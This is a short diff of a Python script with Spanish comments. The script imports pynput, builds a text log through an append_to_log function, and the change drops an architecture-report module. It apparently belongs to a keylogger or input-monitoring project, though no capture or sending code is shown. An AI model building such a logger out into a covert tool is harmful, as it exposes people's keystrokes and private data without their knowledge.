@@ -1,12 +1,11 @@
 import pynput
 import datetime
 import timing
-import arch
+#import arch        # para crear el reporte de arquitectura
 log = ""
 tiempos = timing.tiempos()
 
-#se crea el reporte de la arquitectura
-rarch = arch.arch()   
+
 
 #une los datos que van al txt report
 def append_to_log(string):
